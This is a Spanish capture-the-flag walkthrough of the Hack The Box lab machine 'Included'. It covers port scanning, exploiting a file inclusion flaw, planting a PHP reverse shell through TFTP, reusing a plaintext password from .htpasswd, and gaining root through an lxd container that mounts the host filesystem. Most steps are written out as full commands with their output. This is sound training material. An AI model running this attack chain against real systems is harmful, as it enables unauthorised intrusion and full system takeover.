---
description: Starting point
---

# Included

## Enumeración

```
#Empezamos con nuestro scan típico
nmap -p- --open -n -min-rate 5000 10.129.132.236

Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-13 09:32 CET
Nmap scan report for 10.129.132.236
Host is up (0.10s latency).
Not shown: 64960 filtered tcp ports (no-response), 574 closed tcp ports (conn-refused)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
80/tcp open  http

#Pero sabemos que también tenemos que buscar los puertos UDP porque una de las preguntas del starting point es sobre eso
sudo nmap -sU -v 10.129.132.236
PORT   STATE          SERVICE
68/udp open|filtered  dhcpc
69/udp open|filtered  tftp

```

## Web

Nada más entrar en la web (puerto 80) y mirar la URL nos damos cuenta que tenemos ante nosotros un "[Local File Inclusion/Directory Path Traversal](../../pentesting-web/directory-path-traversal.md)"

![URL vulnerable](<../../.gitbook/assets/image (36) (1).png>)

Podemos comprobarlo intentando acceder a /etc/passwd por ejemplo:

![/etc/passwd a través de LFI/DPT](<../../.gitbook/assets/image (28) (1) (1).png>)

Aunque podemos intentar obtener algo de información del sistema vamos a seguir mirando el resto de servicios.

## TFTP

En este caso tenemos un TFTP y vamos a probar a lanzar el script de enumeración de nmap

```
sudo nmap -n -Pn -sU -p69 -sV --script tftp-enum 10.129.132.236

Nmap scan report for 10.129.132.236
Host is up.

PORT   STATE SERVICE VERSION
69/udp open  tftp?
```

No encontramos nada, pero cómo tenemos una vulnerabilidad LFI podemos intentar averiguar dónde se sube lo que añadimos a través de TFTP.

Así que lo primero será añadir algo, ¿Pero qué?. Vamos a subir una reverse shell mediante PHP, de esta manera al abrirlo con el navegador se interpretará permitiendo acceso a la máquina.

## Reverse PHP Shell

Vamos a utilizar la Reverse Shell de pentestmonkey, así que simplemente con los siguiente comandos ya la tendríamos preparada.

```
wget http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz
tar -xvf php-reverse-shell-1.0.tar.gz
cd php-reverse-shell-1.0/
cp php-reverse-shell.php vamosdentro.php
#Modificamos IP y puerto al que queramos que se conecte
nvim vamosdentro.php
```

A continuación a través de tftp vamos a subir los documentos a la carpeta que esté configurada (Que aún no la sabemos).

```
tftp 10.129.132.236

tftp> put phpshell.php
Sent 228 bytes in 0.1 seconds
tftp> quit
```

Nos toca buscar en Google donde demonios hemos mandado nuestra Reverse Shell.

![Búsqueda de Google](<../../.gitbook/assets/image (26).png>)

Vamos a aprovecharnos de nuestro LFI para ver dónde se suben estos archivos:

![Aprovechando el LFI](<../../.gitbook/assets/image (35) (1) (1).png>)

Por lo que ya sabemos que nuestra reverse shell estará en [http://10.129.132.236/?file=/var/lib/tftpboot/vamosdentro.php](http://10.129.132.236/?file=/var/lib/tftpboot/vamosdentro.php)

Pero tenemos que ponernos en escucha y a continuación ir a la URL:

```
#Nos ponemos en escucha
sudo rlwrap nc -nlvp 1234

[sudo] password for shanks: 
listening on [any] 1234 ...
connect to [10.10.16.32] from (UNKNOWN) [10.129.132.236] 34710
Linux included 4.15.0-151-generic #157-Ubuntu SMP Fri Jul 9 23:07:57 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 09:44:18 up  1:02,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 

```

Ahora hacemos un [tratamiento de la tty](../../pentesting/reverse-shell/tratamiento-de-la-tty.md) para trabajar cómodamente.

Perfecto, ahora estamos dentro cómo usuario www-data, vamos a necesitar movernos lateralmente para conseguir ver la primera flag, la de user.

## Movimiento lateral

Podemos encontrar información muy interesante muchas veces en "/var/www/html"

```
ls -la
total 88
drwxr-xr-x 4 root     root      4096 Oct 13 19:50 .
drwxr-xr-x 3 root     root      4096 Apr 23  2021 ..
-rw-r--r-- 1 www-data www-data   212 Apr 23  2021 .htaccess
-rw-r--r-- 1 www-data www-data    17 Apr 23  2021 .htpasswd
-rw-r--r-- 1 www-data www-data 13828 Apr 29  2014 default.css
drwxr-xr-x 2 www-data www-data  4096 Apr 23  2021 fonts
-rw-r--r-- 1 www-data www-data 20448 Apr 29  2014 fonts.css
-rw-r--r-- 1 www-data www-data  3704 Oct 13 19:50 home.php
drwxr-xr-x 2 www-data www-data  4096 Apr 23  2021 images
-rw-r--r-- 1 www-data www-data   145 Oct 13 19:49 index.php
-rw-r--r-- 1 www-data www-data 17187 Apr 29  2014 license.txt
cat .htpasswd
cat .htpasswd
mike:Sheffield19
```

¿Será la contraseña que queremos para nuestro movimiento lateral?

```
sudo su mike
Enter password: Sheffield19
```

¡Genial!

## Escalada de privilegios

Para seguir buscando formas de escalar privilegios y hacernos root que es nuestro próximo movimiento una de las cosas que podemos hacer es utilizar el comando "id" que nos dice a qué grupos pertenece el usuario actual.

```
#Interesante comando Id
id
id
uid=1000(mike) gid=1000(mike) groups=1000(mike),108(lxd)
```

¿lxd? ¿Qué es eso?¿Podemos aprovecharnos de alguna manera?

Para hacerlo en nuestra máquina hacemos lo siguiente:

```
#Instalamos las dependencias
sudo apt install -y golang-go debootstrap rsync gpg squashfs-tools

#Clonamos el repositorio de Github y lo montamos
git clone https://github.com/lxc/distrobuilder
cd distrobuilder
make

#Creamos un directorio donde descargaremos alpine.yaml y lo montamos.
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.8

#Montamos un servidor con Python para enviar los archivos a la máquina atacada
python3 -m http.server
```

Ahora en la máquina objetivo donde tenemos nuestra Reverse Shell esperando para hacer el mal:

```
#Obtenemos los dos archivos que nos interesan
wget http://10.10.16.32:8000/lxd.tar.xz
wget http://10.10.16.32:8000/lxd.tar.xz
--2021-12-13 10:10:19--  http://10.10.16.32:8000/lxd.tar.xz
Connecting to 10.10.16.32:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 864 [application/x-xz]
Saving to: ‘lxd.tar.xz’

lxd.tar.xz                                      100%[====================================================================================================>]     864  --.-KB/s    in 0s      

2021-12-13 10:10:19 (100 MB/s) - ‘lxd.tar.xz’ saved [864/864]

wget http://10.10.16.32:8000/rootfs.squashfs
wget http://10.10.16.32:8000/rootfs.squashfs
--2021-12-13 10:10:34--  http://10.10.16.32:8000/rootfs.squashfs
Connecting to 10.10.16.32:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2015232 (1.9M) [application/octet-stream]
Saving to: ‘rootfs.squashfs’

rootfs.squashfs                                 100%[====================================================================================================>]   1.92M  1.13MB/s    in 1.7s    

2021-12-13 10:10:36 (1.13 MB/s) - ‘rootfs.squashfs’ saved [2015232/2015232]

#Comprobamos que estén correctamente
ls
ls
lxd.tar.xz  rootfs.squashfs  user.txt

#Los importamos con lxc
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
Image imported with fingerprint: 8ecef12822d7ff51225f4a82547b30b1086f5a6753f022954980b071c7f1bf97

#Mostramos
lxc image list
lxc image list
+--------+--------------+--------+----------------------------------------+--------+--------+-------------------------------+
| ALIAS  | FINGERPRINT  | PUBLIC |              DESCRIPTION               |  ARCH  |  SIZE  |          UPLOAD DATE          |
+--------+--------------+--------+----------------------------------------+--------+--------+-------------------------------+
| alpine | 8ecef12822d7 | no     | Alpinelinux 3.8 x86_64 (20211213_0958) | x86_64 | 1.92MB | Dec 13, 2021 at 10:11am (UTC) |
+--------+--------------+--------+----------------------------------------+--------+--------+-------------------------------+

#Cambiamos security.privileged a true
lxc init alpine privesc -c security.privileged=true
lxc init alpine privesc -c security.privileged=true
Creating privesc

#Configuramos y montamos todo en /mnt/root
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
Device host-root added to privesc

#Iniciamos y ejecutamos una consola cómo root
lxc start privesc
lxc start privesc
lxc exec privesc /bin/sh
lxc exec privesc /bin/sh

#A por la flag
cd /mnt/root/root
cd /mnt/root/root
ls
ls
root.txt
```

Uno más acabado, nos queda una sola máquina del _starting point_.
